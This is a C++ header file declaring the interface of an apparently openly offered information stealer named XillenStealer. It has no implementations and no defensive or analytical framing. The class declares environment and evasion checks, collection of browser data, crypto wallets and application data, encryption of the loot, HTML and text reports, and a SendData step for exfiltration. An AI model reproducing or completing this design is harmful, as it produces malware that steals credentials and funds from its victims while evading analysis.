#ifndef STEALER_H
#define STEALER_H

#include <string>
#include <vector>
#include <cstdint>

class XillenStealer {
private:
    bool initialized;
    std::string collectedData;

    bool CheckEnvironment();
    bool EvasionCheck();
    std::string CollectBrowsers();
    std::string CollectWallets();
    std::string CollectApps();
    std::vector<uint8_t> EncryptData(const std::string& data);
    std::string GenerateTXTReport();
    std::string GenerateHTMLReport();

public:
    XillenStealer();
    ~XillenStealer();

    bool Initialize();
    bool CollectData();
    bool ProcessAndEncrypt();
    bool SendData();
    void Cleanup();
    std::string GetCollectedData() const;
};

#endif
